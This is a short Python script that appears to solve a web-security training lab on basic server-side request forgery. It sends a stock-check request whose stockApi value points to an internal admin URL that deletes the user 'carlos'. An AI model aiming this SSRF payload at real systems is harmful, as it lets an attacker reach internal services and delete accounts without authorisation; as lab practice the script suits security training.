import requests as r 


# Lab: Basic SSRF against the local server


link ="" # endpoint /product/stock


def access_local_host(l):
    myreq =  r.post(l, data={"stockApi": "http://localhost/admin/delete?username=carlos"})
    response= myreq.text

    print(response)



if __name__ =="__main__":
    access_local_host(link)





